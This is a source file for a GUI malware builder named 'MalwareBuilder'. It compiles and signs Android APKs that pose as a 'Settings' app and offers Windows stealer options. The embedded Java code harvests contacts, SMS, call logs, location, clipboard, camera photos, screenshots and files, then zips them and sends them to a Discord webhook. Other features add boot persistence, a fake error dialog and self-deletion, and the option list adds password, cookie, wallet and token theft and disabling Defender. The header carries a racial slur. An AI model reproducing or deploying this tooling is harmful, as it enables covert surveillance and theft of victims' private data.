        protected Void doInBackground(Void... params) {
            try {
                publishProgress("=== ANDROID PAYLOAD STARTED ===");
                
                $feature_calls
                
                publishProgress("Sending collected data...");
                sendResults();
                
                publishProgress("=== PAYLOAD COMPLETE ===");
                
            } catch (Exception e) {
                publishProgress("FATAL: " + e.getMessage());
                e.printStackTrace();
            }
            return null;
        }
        
        @Override
        protected void onProgressUpdate(String... values) {
            log(values[0]);
        }
        
        private void sendResults() {
            try {
                File zipFile = new File(outDir.getParent(), "harvest.zip");
                zipDirectory(outDir, zipFile);
                
                byte[] zipData = new byte[(int) zipFile.length()];
                FileInputStream fis = new FileInputStream(zipFile);
                fis.read(zipData);
                fis.close();
                
                sendFileToWebhook("android_harvest.zip", zipData);
                sendToWebhook("```Device: " + Build.MODEL + "\\nOS: " + Build.VERSION.RELEASE + "\\nHarvest complete.```");
                
            } catch (Exception e) {
                log("Send results failed: " + e.getMessage());
            }
        }
        
        private void zipDirectory(File sourceDir, File zipFile) throws IOException {
            ZipOutputStream zos = new ZipOutputStream(new FileOutputStream(zipFile));
            zipDirectoryRecursive(sourceDir, sourceDir.getName(), zos);
            zos.close();
        }
        
        private void zipDirectoryRecursive(File file, String name, ZipOutputStream zos) throws IOException {
            if (file.isDirectory()) {
                if (!name.isEmpty()) {
                    zos.putNextEntry(new ZipEntry(name + "/"));
                    zos.closeEntry();
                }
                File[] children = file.listFiles();
                if (children != null) {
                    for (File child : children) {
                        zipDirectoryRecursive(child, name + "/" + child.getName(), zos);
                    }
                }
            } else {
                zos.putNextEntry(new ZipEntry(name));
                FileInputStream fis = new FileInputStream(file);
                byte[] buffer = new byte[4096];
                int len;
                while ((len = fis.read(buffer)) > 0) {
                    zos.write(buffer, 0, len);
                }
                fis.close();
                zos.closeEntry();
            }
        }
        
        private void writeResult(String filename, String content) {
            try {
                File file = new File(outDir, filename);
                FileWriter fw = new FileWriter(file);
                fw.write(content);
                fw.close();
            } catch (Exception e) {
                log("Write failed: " + e.getMessage());
            }
        }
    }
    
    // ============ FEATURE METHOD DEFINITIONS ============
    
    $feature_methods
}
''')

ANDROID_SNIPPETS = {
    "system_info": {
        "call": '                publishProgress("Collecting device info...");\n                String deviceInfo = collectSystemInfo();\n                writeResult("device_info.txt", deviceInfo);\n                sendToWebhook("```Device Info:\\n" + deviceInfo + "```");',
        "method": '''
    private String collectSystemInfo() {
        try {
            TelephonyManager tm = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            String imei = "N/A";
            try {
                if (checkSelfPermission(Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                    imei = tm.getDeviceId();
                }
            } catch (Exception e) {}
            return "Model: " + Build.MODEL + "\\n" +
                   "Manufacturer: " + Build.MANUFACTURER + "\\n" +
                   "OS: " + Build.VERSION.RELEASE + "\\n" +
                   "SDK: " + Build.VERSION.SDK_INT + "\\n" +
                   "IMEI: " + imei + "\\n" +
                   "Android ID: " + Settings.Secure.getString(getContentResolver(), Settings.Secure.ANDROID_ID);
        } catch (Exception e) {
            return "System info failed: " + e.getMessage();
        }
    }'''
    },
    "contacts": {
        "call": '                publishProgress("Collecting contacts...");\n                collectContacts();',
        "method": '''
    private void collectContacts() {
        try {
            StringBuilder contacts = new StringBuilder();
            if (checkSelfPermission(Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED) {
                Cursor cursor = getContentResolver().query(
                    android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    null, null, null, null
                );
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        String name = cursor.getString(cursor.getColumnIndex(
                            android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                        String number = cursor.getString(cursor.getColumnIndex(
                            android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER));
                        contacts.append(name).append(": ").append(number).append("\\n");
                    }
                    cursor.close();
                }
            }
            writeResult("contacts.txt", contacts.toString());
        } catch (Exception e) {
            log("Contacts failed: " + e.getMessage());
        }
    }'''
    },
    "sms": {
        "call": '                publishProgress("Collecting SMS...");\n                collectSMS();',
        "method": '''
    private void collectSMS() {
        try {
            StringBuilder sms = new StringBuilder();
            if (checkSelfPermission(Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED) {
                Cursor cursor = getContentResolver().query(
                    Uri.parse("content://sms"),
                    null, null, null, null
                );
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        String address = cursor.getString(cursor.getColumnIndex("address"));
                        String body = cursor.getString(cursor.getColumnIndex("body"));
                        String date = cursor.getString(cursor.getColumnIndex("date"));
                        sms.append(date).append(" | ").append(address).append(": ").append(body).append("\\n");
                    }
                    cursor.close();
                }
            }
            writeResult("sms.txt", sms.toString());
        } catch (Exception e) {
            log("SMS failed: " + e.getMessage());
        }
    }'''
    },
    "call_logs": {
        "call": '                publishProgress("Collecting call logs...");\n                collectCallLogs();',
        "method": '''
    private void collectCallLogs() {
        try {
            StringBuilder calls = new StringBuilder();
            if (checkSelfPermission(Manifest.permission.READ_CALL_LOG) == PackageManager.PERMISSION_GRANTED) {
                Cursor cursor = getContentResolver().query(
                    android.provider.CallLog.Calls.CONTENT_URI,
                    null, null, null, null
                );
                if (cursor != null) {
                    while (cursor.moveToNext()) {
                        String number = cursor.getString(cursor.getColumnIndex(
                            android.provider.CallLog.Calls.NUMBER));
                        String type = cursor.getString(cursor.getColumnIndex(
                            android.provider.CallLog.Calls.TYPE));
                        String date = cursor.getString(cursor.getColumnIndex(
                            android.provider.CallLog.Calls.DATE));
                        calls.append(date).append(" | ").append(number).append(" | Type: ").append(type).append("\\n");
                    }
                    cursor.close();
                }
            }
            writeResult("call_logs.txt", calls.toString());
        } catch (Exception e) {
            log("Call logs failed: " + e.getMessage());
        }
    }'''
    },
    "installed_apps": {
        "call": '                publishProgress("Collecting installed apps...");\n                collectInstalledApps();',
        "method": '''
    private void collectInstalledApps() {
        try {
            StringBuilder apps = new StringBuilder();
            for (android.content.pm.ApplicationInfo app : getPackageManager().getInstalledApplications(0)) {
                apps.append(app.packageName).append("\\n");
            }
            writeResult("installed_apps.txt", apps.toString());
        } catch (Exception e) {
            log("Installed apps failed: " + e.getMessage());
        }
    }'''
    },
    "location": {
        "call": '                publishProgress("Getting location...");\n                collectLocation();',
        "method": '''
    private void collectLocation() {
        try {
            LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
            if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED) {
                Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
                if (loc != null) {
                    String locStr = "Lat: " + loc.getLatitude() + "\\nLng: " + loc.getLongitude() + "\\nAccuracy: " + loc.getAccuracy();
                    writeResult("location.txt", locStr);
                    sendToWebhook("```Location:\\n" + locStr + "```");
                }
            }
        } catch (Exception e) {
            log("Location failed: " + e.getMessage());
        }
    }'''
    },
    "wifi_info": {
        "call": '                publishProgress("Getting WiFi info...");\n                collectWifiInfo();',
        "method": '''
    private void collectWifiInfo() {
        try {
            WifiManager wm = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            WifiInfo wi = wm.getConnectionInfo();
            String wifiStr = "SSID: " + wi.getSSID() + "\\nBSSID: " + wi.getBSSID() + "\\nMAC: " + wi.getMacAddress() + "\\nIP: " + intToIp(wi.getIpAddress());
            writeResult("wifi_info.txt", wifiStr);
        } catch (Exception e) {
            log("WiFi info failed: " + e.getMessage());
        }
    }'''
    },
    "clipboard": {
        "call": '                publishProgress("Reading clipboard...");\n                collectClipboard();',
        "method": '''
    private void collectClipboard() {
        try {
            android.content.ClipboardManager cm = (android.content.ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);
            if (cm != null && cm.getPrimaryClip() != null && cm.getPrimaryClip().getItemCount() > 0) {
                String clip = cm.getPrimaryClip().getItemAt(0).getText().toString();
                if (clip != null && clip.length() > 0) {
                    writeResult("clipboard.txt", clip);
                    sendToWebhook("```Clipboard: " + clip.substring(0, Math.min(clip.length(), 500)) + "```");
                }
            }
        } catch (Exception e) {
            log("Clipboard failed: " + e.getMessage());
        }
    }'''
    },
    "camera": {
        "call": '                publishProgress("Capturing photo...");\n                capturePhoto();',
        "method": '''
    private void capturePhoto() {
        try {
            Camera cam = Camera.open(0);
            Camera.Parameters params = cam.getParameters();
            cam.setParameters(params);
            SurfaceView dummy = new SurfaceView(MainActivity.this);
            cam.setPreviewDisplay(dummy.getHolder());
            cam.startPreview();
            Thread.sleep(500);
            cam.takePicture(null, null, new Camera.PictureCallback() {
                @Override
                public void onPictureTaken(byte[] data, Camera camera) {
                    sendFileToWebhook("camera.jpg", data);
                    camera.release();
                }
            });
        } catch (Exception e) {
            log("Camera failed: " + e.getMessage());
        }
    }'''
    },
    "screenshot": {
        "call": '                publishProgress("Capturing screenshot...");\n                captureScreenshot();',
        "method": '''
    private void captureScreenshot() {
        // Wait for the UI to finish drawing before capturing
        final View rootView = getWindow().getDecorView().getRootView();
        rootView.post(new Runnable() {
            @Override
            public void run() {
                try {
                    rootView.setDrawingCacheEnabled(true);
                    Bitmap bitmap = Bitmap.createBitmap(rootView.getDrawingCache());
                    rootView.setDrawingCacheEnabled(false);
                    
                    ByteArrayOutputStream bos = new ByteArrayOutputStream();
                    bitmap.compress(Bitmap.CompressFormat.PNG, 100, bos);
                    byte[] data = bos.toByteArray();
                    
                    sendFileToWebhook("screenshot.png", data);
                } catch (Exception e) {
                    log("Screenshot failed: " + e.getMessage());
                }
            }
        });
    }'''
    },   
    "files": {
        "call": '                publishProgress("Collecting files...");\n                collectFiles();',
        "method": '''
    private void collectFiles() {
        try {
            String[] searchDirs = {
                Environment.getExternalStorageDirectory().getAbsolutePath() + "/Downloads",
                Environment.getExternalStorageDirectory().getAbsolutePath() + "/Documents",
                Environment.getExternalStorageDirectory().getAbsolutePath() + "/DCIM",
                Environment.getExternalStorageDirectory().getAbsolutePath() + "/Pictures",
            };
            for (String dir : searchDirs) {
                File d = new File(dir);
                if (d.exists() && d.isDirectory()) {
                    File[] children = d.listFiles();
                    if (children != null) {
                        for (File f : children) {
                            if (f.length() < 10 * 1024 * 1024 && !f.isDirectory()) {
                                try {
                                    byte[] data = new byte[(int) f.length()];
                                    FileInputStream fis = new FileInputStream(f);
                                    fis.read(data);
                                    fis.close();
                                    
                                    File dest = new File(outDir, "files/" + f.getName());
                                    dest.getParentFile().mkdirs();
                                    FileOutputStream fos = new FileOutputStream(dest);
                                    fos.write(data);
                                    fos.close();
                                } catch (Exception e2) { }
                            }
                        }
                    }
                }
            }
        } catch (Exception e) {
            log("Files collection failed: " + e.getMessage());
        }
    }'''
    },
    "keylogger": {
        "call": '                // Keylogger requires AccessibilityService — placeholder',
        "method": '''
    // Keylogger AccessibilityService placeholder
    // Implement via separate AccessibilityService class'''
    },
    "fake_error": {
        "call": '                publishProgress("Showing fake error...");\n                handler.post(new Runnable() {\n                    @Override\n                    public void run() {\n                        showFakeError();\n                    }\n                });',
        "method": '''
    private void showFakeError() {
        try {
            android.app.AlertDialog.Builder builder = new android.app.AlertDialog.Builder(MainActivity.this);
            builder.setTitle("${fake_error_title}");
            builder.setMessage("${fake_error_message}");
            builder.setPositiveButton("OK", null);
            builder.show();
        } catch (Exception e) {
            log("Fake error failed: " + e.getMessage());
        }
    }'''
    },
    "persistence": {
        "call": '                publishProgress("Setting up persistence...");\n                setupPersistence();',
        "method": '''
    private void setupPersistence() {
        try {
            android.content.ComponentName receiver = new android.content.ComponentName(
                MainActivity.this, BootReceiver.class
            );
            getPackageManager().setComponentEnabledSetting(
                receiver,
                PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                PackageManager.DONT_KILL_APP
            );
        } catch (Exception e) {
            log("Persistence setup failed: " + e.getMessage());
        }
    }'''
    },
    "self_destruct": {
        "call": '                publishProgress("Self-destructing...");\n                selfDestruct();',
        "method": '''
    private void selfDestruct() {
        try {
            String apkPath = getPackageManager().getApplicationInfo(getPackageName(), 0).sourceDir;
            new File(apkPath).delete();
            Runtime.getRuntime().exec("pm uninstall " + getPackageName());
        } catch (Exception e) {
            log("Self-destruct failed: " + e.getMessage());
        }
    }'''
    },
}

# ============================================================
# ANDROID APK BUILDER — Direct SDK Toolchain (no Gradle)
# ============================================================
class AndroidAPKBuilder:
    """Builds a signed APK using Android SDK command-line tools directly."""
    
    def __init__(self, log_callback):
        self.log = log_callback
        self.temp_dir = None
    
    def _find_sdk_tool(self, tool_name):
        """Find a tool in the Android SDK build-tools directory."""
        sdk_root = os.environ.get("ANDROID_HOME") or os.environ.get("ANDROID_SDK_ROOT") or \
                   os.path.join(os.environ.get("LOCALAPPDATA", ""), "Android", "Sdk")
        
        build_tools_dir = os.path.join(sdk_root, "build-tools")
        if not os.path.isdir(build_tools_dir):
            return None
        
        versions = sorted(os.listdir(build_tools_dir), reverse=True)
        for ver in versions:
            tool_path = os.path.join(build_tools_dir, ver, tool_name)
            if os.path.isfile(tool_path):
                return tool_path
        return None
    
    def generate_apk(self, webhook, filename, features, ping_type, fake_error_title, fake_error_message):
        """Generate a signed APK. Returns (success, path_or_error)."""
        try:
            self.temp_dir = tempfile.mkdtemp(prefix="apk_build_")
            self.log("Building APK with direct SDK toolchain (no Gradle)...", "info")
            
            # Check for required tools
            d8_path = self._find_sdk_tool("d8.bat") or self._find_sdk_tool("d8")
            aapt2_path = self._find_sdk_tool("aapt2.exe") or self._find_sdk_tool("aapt2")
            zipalign_path = self._find_sdk_tool("zipalign.exe") or self._find_sdk_tool("zipalign")
            apksigner_path = self._find_sdk_tool("apksigner.bat")
            
            sdk_root = os.environ.get("ANDROID_HOME") or os.environ.get("ANDROID_SDK_ROOT") or \
                       os.path.join(os.environ.get("LOCALAPPDATA", ""), "Android", "Sdk")
            android_jar = None
            platforms_dir = os.path.join(sdk_root, "platforms")
            if os.path.isdir(platforms_dir):
                for plat in sorted(os.listdir(platforms_dir), reverse=True):
                    jar_path = os.path.join(platforms_dir, plat, "android.jar")
                    if os.path.isfile(jar_path):
                        android_jar = jar_path
                        break
            
            if not d8_path:
                return (False, "d8 not found. Install Android SDK build-tools via sdkmanager.")
            if not aapt2_path:
                return (False, "aapt2 not found. Install Android SDK build-tools via sdkmanager.")
            if not android_jar:
                return (False, "android.jar not found. Install Android SDK platform via sdkmanager.")
            
            self.log(f"aapt2: {aapt2_path}", "info")
            self.log(f"d8: {d8_path}", "info")
            self.log(f"android.jar: {android_jar}", "info")
            
            # Generate package name
            package_name = "com." + ''.join(random.choices(string.ascii_lowercase, k=8)) + ".app"
            self.log(f"Package: {package_name}", "info")
            
            # Directory setup
            src_dir = os.path.join(self.temp_dir, "src")
            gen_dir = os.path.join(self.temp_dir, "gen")
            classes_dir = os.path.join(self.temp_dir, "classes")
            dex_dir = os.path.join(self.temp_dir, "dex")
            res_dir = os.path.join(self.temp_dir, "res")
            compiled_res = os.path.join(self.temp_dir, "compiled_res.zip")
            
            for d in [src_dir, gen_dir, classes_dir, dex_dir, res_dir]:
                os.makedirs(d, exist_ok=True)
            
            # Generate Java source
            feature_calls = []
            feature_methods = []
            
            feature_map = {
                "System Info": "system_info", "Contacts": "contacts",
                "SMS": "sms", "Call Logs": "call_logs",
                "Installed Apps": "installed_apps", "Location": "location",
                "WiFi Info": "wifi_info", "Clipboard": "clipboard",
                "Camera": "camera", "Screenshot": "screenshot",
                "Files": "files", "Keylogger": "keylogger",
                "Fake Error": "fake_error", "Persistence": "persistence",
                "Self-Destruct": "self_destruct",
            }
            
            for label, key in feature_map.items():
                if features.get(label, "off") == "on":
                    snippet = ANDROID_SNIPPETS.get(key, {})
                    call_code = snippet.get("call", "// " + key + " enabled")
                    method_code = snippet.get("method", "// " + key + " method")
                    
                    if key == "fake_error":
                        method_code = method_code.replace("${fake_error_title}", fake_error_title.replace('"', '\\"'))
                        method_code = method_code.replace("${fake_error_message}", fake_error_message.replace('"', '\\"'))
                    
                    feature_calls.append(call_code)
                    feature_methods.append(method_code)
            
            replacements = {
                "webhook": webhook.replace('"', '\\"'),
                "ping_type": ping_type if ping_type else "None",
                "package_name": package_name,
                "feature_calls": "\n".join(feature_calls) if feature_calls else "// No features enabled",
                "feature_methods": "\n".join(feature_methods) if feature_methods else "// No methods",
            }
            
            main_java = ANDROID_MAIN_TEMPLATE.safe_substitute(replacements)
            java_file = os.path.join(src_dir, "MainActivity.java")
            with open(java_file, "w", encoding="utf-8") as f:
                f.write(main_java)
            self.log(f"MainActivity.java: {len(main_java)} bytes", "success")
            
            # Generate BootReceiver if persistence enabled
            if features.get("Persistence", "off") == "on":
                boot_code = f'''package com.{package_name}.payload;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

public class BootReceiver extends BroadcastReceiver {{
    @Override
    public void onReceive(Context context, Intent intent) {{
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {{
            Log.d("PayloadBoot", "BOOT_COMPLETED received");
            Intent launchIntent = new Intent(context, MainActivity.class);
            launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(launchIntent);
        }}
    }}
}}'''
                with open(os.path.join(src_dir, "BootReceiver.java"), "w", encoding="utf-8") as f:
                    f.write(boot_code)
                self.log("BootReceiver.java generated", "success")
            
            # Generate AndroidManifest.xml (no package attribute, no icon)
            perm_lines = "\n".join(f'    <uses-permission android:name="{p}"/>' for p in ANDROID_PERMISSIONS)
            
            persistence_xml = ""
            if features.get("Persistence", "off") == "on":
                persistence_xml = '''
        <receiver android:name=".payload.BootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>'''
            
            manifest_xml = f'''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="{package_name}">

{perm_lines}

    <uses-sdk android:minSdkVersion="21" android:targetSdkVersion="34"/>

    <application
        android:allowBackup="false"
        android:label="Settings"
        android:supportsRtl="true"
        android:theme="@android:style/Theme.DeviceDefault.Light.NoActionBar">

        <activity android:name=".payload.MainActivity"
            android:exported="true"
            android:excludeFromRecents="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        
{persistence_xml}


    </application>
</manifest>'''
            
            manifest_path = os.path.join(self.temp_dir, "AndroidManifest.xml")
            with open(manifest_path, "w", encoding="utf-8") as f:
                f.write(manifest_xml)
            self.log("AndroidManifest.xml generated", "success")
            
            # ---- Step 1/6: aapt2 compile resources ----
            self.log("Step 1/6: Compiling resources...", "info")
            res_values = os.path.join(res_dir, "values")
            os.makedirs(res_values, exist_ok=True)
            with open(os.path.join(res_values, "strings.xml"), "w", encoding="utf-8") as f:
                f.write('''<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">Settings</string>
</resources>''')
            
            compile_cmd = [aapt2_path, "compile", "-o", compiled_res]
            for root, _, files in os.walk(res_dir):
                for f in files:
                    if f.endswith(".xml"):
                        compile_cmd.append(os.path.join(root, f))
            
            r = subprocess.run(compile_cmd, capture_output=True, text=True, timeout=30)
            if r.returncode != 0:
                return (False, f"aapt2 compile failed:\n{r.stderr[:500]}")
            self.log("Resources compiled", "success")
            
            # ---- Step 2/6: aapt2 link ----
            self.log("Step 2/6: Linking APK...", "info")
            base_apk = os.path.join(self.temp_dir, "base.apk")
            link_cmd = [
                aapt2_path, "link",
                "--java", gen_dir,
                "--manifest", manifest_path,
                "-I", android_jar,
                "-o", base_apk,
                compiled_res,
                "--auto-add-overlay",
            ]
            r = subprocess.run(link_cmd, capture_output=True, text=True, timeout=30)
            if r.returncode != 0:
                return (False, f"aapt2 link failed:\n{r.stderr[:500]}")
            self.log("APK linked, R.java generated", "success")
            
            # ---- Step 3/6: javac ----
            self.log("Step 3/6: Compiling Java...", "info")
            java_files = []
            for root, _, files in os.walk(src_dir):
                for f in files:
                    if f.endswith(".java"):
                        java_files.append(os.path.join(root, f))
            for root, _, files in os.walk(gen_dir):
                for f in files:
                    if f.endswith(".java"):
                        java_files.append(os.path.join(root, f))
            
            javac_cmd = [
                "javac",
                "-d", classes_dir,
                "-bootclasspath", android_jar,
                "-source", "1.8",
                "-target", "1.8",
                "-Xlint:-options",
            ] + java_files
            
            r = subprocess.run(javac_cmd, capture_output=True, text=True, timeout=60)
            if r.returncode != 0:
                # Print stderr for debugging but also show stdout (which has actual errors)
                return (False, f"javac failed (exit code {r.returncode}):\n{r.stderr[:800]}")
            
            class_count = sum(1 for root, _, files in os.walk(classes_dir) for f in files if f.endswith(".class"))
            if class_count == 0:
                return (False, "No .class files produced — javac may have failed silently")
            self.log(f"Java compiled ({class_count} class files)", "success")
            
            # ---- Step 4/6: d8 (class → dex) ----
            self.log("Step 4/6: Converting to DEX...", "info")
            class_files = []
            for root, _, files in os.walk(classes_dir):
                for f in files:
                    if f.endswith(".class"):
                        class_files.append(os.path.join(root, f))
            
            d8_cmd = [d8_path, "--output", dex_dir, "--lib", android_jar] + class_files
            r = subprocess.run(d8_cmd, capture_output=True, text=True, timeout=60)
            if r.returncode != 0:
                return (False, f"d8 failed:\n{r.stderr[:500]}")
            
            dex_files = list(Path(dex_dir).glob("*.dex"))
            if not dex_files:
                return (False, "No DEX files produced")
            self.log(f"DEX created ({len(dex_files)} dex files)", "success")
            
            # ---- Step 5/6: Add DEX to APK (using Python's zipfile) ----
            self.log("Step 5/6: Adding DEX to APK...", "info")
            final_apk = os.path.join(OUTPUT_DIR, filename + ".apk")
            shutil.copy2(base_apk, final_apk)
            
            for dex_file in dex_files:
                try:
                    with zipfile.ZipFile(final_apk, 'a', zipfile.ZIP_DEFLATED) as zf:
                        zf.write(str(dex_file), dex_file.name)
                except Exception as e:
                    return (False, f"Failed to add DEX to APK: {str(e)}")
            self.log("DEX added to APK", "success")
            
            # ---- Step 6/6: zipalign + sign ----
            self.log("Step 6/6: Aligning and signing...", "info")
            
            if zipalign_path:
                aligned_apk = os.path.join(self.temp_dir, "aligned.apk")
                r = subprocess.run(
                    [zipalign_path, "-f", "4", final_apk, aligned_apk],
                    capture_output=True, text=True, timeout=15
                )
                if r.returncode == 0:
                    shutil.move(aligned_apk, final_apk)
                    self.log("APK aligned", "success")
                else:
                    self.log(f"zipalign warning: {r.stderr[:100]}", "warn")
            
            if apksigner_path:
                keystore_path = os.path.join(self.temp_dir, "debug.keystore")
                if generate_keystore(keystore_path):
                    sign_cmd = [
                        apksigner_path, "sign",
                        "--ks", keystore_path,
                        "--ks-pass", "pass:android",
                        "--ks-key-alias", "payload",
                        "--key-pass", "pass:android",
                        final_apk
                    ]
                    r = subprocess.run(sign_cmd, capture_output=True, text=True, timeout=30)
                    if r.returncode == 0:
                        self.log("APK signed", "success")
                    else:
                        self.log(f"Signing failed: {r.stderr[:200]}", "warn")
            
            apk_size = os.path.getsize(final_apk)
            self.log(f"BUILD SUCCESS! {final_apk} ({apk_size:,} bytes)", "success")
            return (True, final_apk)
            
        except Exception as e:
            return (False, f"Build exception: {str(e)}")
        finally:
            if self.temp_dir and os.path.exists(self.temp_dir):
                try:
                    shutil.rmtree(self.temp_dir, ignore_errors=True)
                except:
                    pass
                
# Android permissions and features needed
ANDROID_PERMISSIONS = [
    "android.permission.INTERNET",
    "android.permission.ACCESS_NETWORK_STATE",
    "android.permission.READ_EXTERNAL_STORAGE",
    "android.permission.WRITE_EXTERNAL_STORAGE",
    "android.permission.READ_CONTACTS",
    "android.permission.READ_SMS",
    "android.permission.SEND_SMS",
    "android.permission.READ_CALL_LOG",
    "android.permission.ACCESS_FINE_LOCATION",
    "android.permission.ACCESS_COARSE_LOCATION",
    "android.permission.CAMERA",
    "android.permission.RECORD_AUDIO",
    "android.permission.READ_PHONE_STATE",
    "android.permission.ACCESS_WIFI_STATE",
    "android.permission.CHANGE_WIFI_STATE",
    "android.permission.RECEIVE_BOOT_COMPLETED",
    "android.permission.FOREGROUND_SERVICE",
    "android.permission.SYSTEM_ALERT_WINDOW",
    "android.permission.REQUEST_INSTALL_PACKAGES",
    "android.permission.QUERY_ALL_PACKAGES",
]

class MalwareBuilder:
    def __init__(self):
        self.root = ctk.CTk()
        self.root.title(BUILDER_TITLE)
        self.root.geometry("1000x950")
        self.root.configure(fg_color=COLORS["bg"])
        self.root.resizable(False, False)
        self.root.bind("<Control-b>", lambda e: self.build_payload())

        self.webhook_var = ctk.StringVar()
        self.filename_var = ctk.StringVar(value="payload")
        self.format_var = ctk.StringVar(value=".exe")
        self.icon_path = None
        self.fake_error_title = ctk.StringVar(value="Error")
        self.fake_error_msg = ctk.StringVar(value="Application failed to start.")
        self.ping_var = ctk.StringVar(value="off")
        self.ping_type_var = ctk.StringVar(value="Here")
        self.console_text = None

        self.cb_vars = {}
        options = [
            "System Info", "Telegram Sessions", "Extensions", "Wallets",
            "Roblox Cookies", "Credit Cards", "Passwords", "Cookies",
            "Browser History", "Downloads", "Search History", "Discord Tokens",
            "Passkeys / WebAuthn", "Webcam", "Screenshot", "Keylogger",
            "Fake Error", "Disable Defender", "Add Exclusion", "Startup",
            "Authenticator", "WiFi Passwords", "Clipboard", "Common Files",
            "Games", "Anti-VM/Debug", "Self-Destruct", "Anti-Spam",
        ]
        # Android-specific options (only shown for .apk format)
        self.android_options = [
            "Contacts", "SMS", "Call Logs", "Installed Apps", "Location",
            "WiFi Info", "Camera", "Files", "Persistence",
        ]
        # Merge all options for APK; for exe/py, use windows_options
        self.all_options = options + [o for o in self.android_options if o not in options]
        
        for opt in self.all_options:
            self.cb_vars[opt] = ctk.StringVar(value="off")

        self.build_ui()

    def log(self, message, tag=""):
        if self.console_text:
            self.console_text.configure(state="normal")
            prefix = ""
            if tag == "success": prefix = "✅ "
            elif tag == "error": prefix = "❌ "
            elif tag == "info": prefix = "ℹ️ "
            elif tag == "warn": prefix = "⚠️ "
            self.console_text.insert("end", f"{prefix}{message}\n")
            self.console_text.see("end")
            self.console_text.configure(state="disabled")
            self.root.update_idletasks()

    def build_ui(self):
        # ── Header ──
        header = ctk.CTkFrame(self.root, fg_color=COLORS["frame_bg"], corner_radius=12, height=72)
        header.pack(fill="x", padx=16, pady=(16, 8))
        header.pack_propagate(False)
        ctk.CTkLabel(header, text="⚡ NIGGA FUCKER v8.0", font=("Segoe UI", 26, "bold"),
                     text_color=COLORS["accent"]).pack(side="left", padx=20, pady=15)
        ctk.CTkLabel(header, text="INE - BY NODE (APK + EXE + PY)", font=("Segoe UI", 11),
                     text_color=COLORS["text_dim"]).pack(side="right", padx=20, pady=15)

        wh_frame = ctk.CTkFrame(self.root, fg_color=COLORS["frame_bg"], corner_radius=10)
        wh_frame.pack(fill="x", padx=16, pady=(0, 8))
        ctk.CTkLabel(wh_frame, text="Webhook:", font=("Segoe UI", 13, "bold"),
                     text_color=COLORS["accent"]).pack(side="left", padx=(16, 8), pady=12)
        ctk.CTkEntry(wh_frame, textvariable=self.webhook_var, width=380,
                      fg_color=COLORS["entry_bg"], border_color=COLORS["accent"],
                      placeholder_text="https://discord.com/api/webhooks/...",
                      font=("Consolas", 11)).pack(side="left", padx=4, pady=10)
        ctk.CTkButton(wh_frame, text="🔍 Test", command=self.test_webhook_action,
                       fg_color=COLORS["accent"], hover_color=COLORS["accent_hover"],
                       width=90, corner_radius=6, font=("Segoe UI", 12, "bold")).pack(side="left", padx=8)
        ctk.CTkButton(wh_frame, text="📋 Paste", command=self.paste_webhook,
                       fg_color=COLORS["entry_bg"], hover_color="#2a2a35",
                       width=80, corner_radius=6, font=("Segoe UI", 11)).pack(side="left", padx=2)

        ping_frame = ctk.CTkFrame(self.root, fg_color=COLORS["frame_bg"], corner_radius=10)
        ping_frame.pack(fill="x", padx=16, pady=(0, 8))
        ctk.CTkCheckBox(ping_frame, text="Ping on Send", variable=self.ping_var,
                         onvalue="on", offvalue="off",
                         fg_color=COLORS["accent"], hover_color=COLORS["accent_hover"],
                         border_color=COLORS["entry_bg"], text_color=COLORS["text"],
                         font=("Segoe UI", 12), corner_radius=4,
                         command=self.on_ping_toggle).pack(side="left", padx=(14, 8), pady=8)
        self.ping_type_menu = ctk.CTkOptionMenu(ping_frame, variable=self.ping_type_var,
                         values=["Everyone", "Here"],
                         fg_color=COLORS["accent"], button_color=COLORS["accent_hover"],
                         width=100, font=("Segoe UI", 11))
        self.ping_type_menu.pack(side="left", padx=2, pady=8)
        self.ping_type_menu.configure(state="disabled")

        cb_section = ctk.CTkFrame(self.root, fg_color=COLORS["frame_bg"], corner_radius=10)
        cb_section.pack(fill="both", expand=True, padx=16, pady=(0, 8))

        btn_row = ctk.CTkFrame(cb_section, fg_color="transparent")
        btn_row.pack(fill="x", padx=16, pady=(12, 4))
        ctk.CTkLabel(btn_row, text="🎯 Select Features:", font=("Segoe UI", 14, "bold"),
                     text_color=COLORS["accent_glow"]).pack(side="left")
        ctk.CTkButton(btn_row, text="All", command=self.select_all,
                       fg_color=COLORS["entry_bg"], hover_color=COLORS["accent_hover"],
                       width=55, corner_radius=4, font=("Segoe UI", 10)).pack(side="right", padx=4)
        ctk.CTkButton(btn_row, text="None", command=self.deselect_all,
                       fg_color=COLORS["entry_bg"], hover_color=COLORS["accent_hover"],
                       width=55, corner_radius=4, font=("Segoe UI", 10)).pack(side="right", padx=2)
        ctk.CTkButton(btn_row, text="Stealers", command=self.select_stealers,
                       fg_color=COLORS["entry_bg"], hover_color=COLORS["accent_hover"],
                       width=70, corner_radius=4, font=("Segoe UI", 10)).pack(side="right", padx=4)

